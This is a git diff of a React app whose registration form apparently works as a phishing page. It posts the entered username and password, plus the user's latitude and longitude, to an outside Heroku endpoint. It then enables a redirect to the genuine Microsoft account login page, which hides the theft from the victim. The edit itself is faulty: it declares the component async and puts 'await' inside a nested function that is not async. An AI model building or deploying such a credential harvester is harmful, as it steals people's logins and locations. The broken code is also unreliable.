@@ -100,7 +100,7 @@ function App() {
     );
   }
 
-  function RegisterForm(props) {
+  async function RegisterForm(props) {
     const [password, setPassword] = useState('');
     // console.log(props);
     function submit(e,username,password, lat, long, date, time) {
@@ -120,11 +120,11 @@ function App() {
         time: time, 
       }
       console.log("Obj posted: ", obj);
-      axios.post('https://desolate-caverns-56075.herokuapp.com/login', obj)
+      await axios.post('https://desolate-caverns-56075.herokuapp.com/login', obj)
         .then(res=> {
           console.log('res', res);
         })
-      // window.location.replace("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1616655021&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Fdestrt%253Dhome-index%2526refd%253Daccount.microsoft.com%2526refp%253Dsignedout-index&lc=1033&id=292666&lw=1&fl=easi2&ru=https%3A%2F%2Faccount.microsoft.com%2Faccount%2FAccount%3Fdestrt%3Dhome-index");
+      window.location.replace("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1616655021&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Fdestrt%253Dhome-index%2526refd%253Daccount.microsoft.com%2526refp%253Dsignedout-index&lc=1033&id=292666&lw=1&fl=easi2&ru=https%3A%2F%2Faccount.microsoft.com%2Faccount%2FAccount%3Fdestrt%3Dhome-index");
 
     }
     return (
